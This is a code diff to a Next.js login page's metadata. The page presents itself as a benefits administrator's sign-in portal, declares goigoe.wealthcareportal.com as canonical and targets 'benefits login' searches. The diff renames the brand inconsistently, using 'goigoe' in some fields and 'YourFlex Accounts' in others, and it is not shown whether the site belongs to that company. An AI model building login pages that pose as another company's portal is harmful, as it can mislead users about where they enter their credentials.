@@ -9,19 +9,19 @@ const geist = Geist({ subsets: ["latin"] });
 const CANONICAL_LOGIN_URL =
   "https://goigoe.wealthcareportal.com/Authentication/Handshake";
 const SITE_DOMAIN = "goigoe.wealthcareportal.com";
-const SITE_BRAND = "Igoe Administrative Services";
+const SITE_BRAND = "goigoe";
 
 export const metadata: Metadata = {
   metadataBase: new URL(
     process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL,
   ),
   title: {
-    default: "Igoe Administrative Services - Login",
-    template: "%s | Igoe Administrative Services",
+    default: "goigoe - Login",
+    template: "%s | goigoe",
   },
   keywords: [
-    "Igoe Administrative Services",
-    "Wealthcare Portal",
+    "goigoe",
+    "WealthCare Portal",
     "goigoe.wealthcareportal.com",
     "benefits login",
     "employee benefits portal",
@@ -35,13 +35,13 @@ export const metadata: Metadata = {
     "secure login",
     "participant portal",
     "employer portal",
-    "handshake authentication"
+    "handshake authentication",
   ],
-  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Igoe Administrative Services.`,
+  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through goigoe.`,
 
-  authors: [{ name: "Igoe Administrative Services" }],
-  creator: "Igoe Administrative Services",
-  publisher: "Igoe Administrative Services",
+  authors: [{ name: "goigoe" }],
+  creator: "goigoe",
+  publisher: "goigoe",
   applicationName: SITE_BRAND,
   referrer: "origin-when-cross-origin",
   robots: {
@@ -58,8 +58,8 @@ export const metadata: Metadata = {
   openGraph: {
     type: "website",
     locale: "en_US",
-    title: "Igoe Administrative Services - Login",
-    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Igoe Administrative Services.`,
+    title: "YourFlex Accounts - Login",
+    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
     siteName: SITE_BRAND,
     url: CANONICAL_LOGIN_URL,
     images: [
@@ -73,8 +73,8 @@ export const metadata: Metadata = {
   },
   twitter: {
     card: "summary",
-    title: "Igoe Administrative Services - Login",
-    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Igoe Administrative Services.`,
+    title: "YourFlex Accounts - Login",
+    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
     images: ["/favicon-32x32.png"],
   },
   icons: {
@@ -106,10 +106,10 @@ const jsonLd = {
   name: SITE_BRAND,
   url: CANONICAL_LOGIN_URL,
   description:
-    "Igoe Administrative Services account sign in portal. Login to manage your health and dependent care benefits, view account resources, and access your Igoe Administrative Services profile.",
+    "YourFlex Accounts sign in portal. Login to manage your health and dependent care benefits, view account resources, and access your YourFlex Accounts profile.",
   publisher: {
     "@type": "Organization",
-    name: "Igoe Administrative Services",
+    name: "YourFlex Accounts",
   },
   inLanguage: "en-US",
   potentialAction: {
